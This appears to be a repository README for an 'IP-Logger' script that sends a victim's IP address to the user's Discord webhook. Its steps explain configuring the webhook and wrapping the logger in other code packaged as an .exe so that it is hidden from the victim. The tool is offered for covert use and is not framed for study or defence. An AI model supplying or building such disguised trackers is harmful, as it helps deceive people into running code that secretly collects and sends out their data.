# IP-Logger
Simple IP Logger that sends the victim ip to your Discord Webhook

# Steps
1) open a cmd inside the folder of the script
2) write "pip install -r requirements.txt"
3) You have to put a Webhook on Line 12: "webhook = DiscordWebhook(url='YOUR WEBHOOK')"
4) After line 19 you can add your own code and give it to the victim as an .exe or whatever you want to "hide" the ip logger

Enjoy using it!
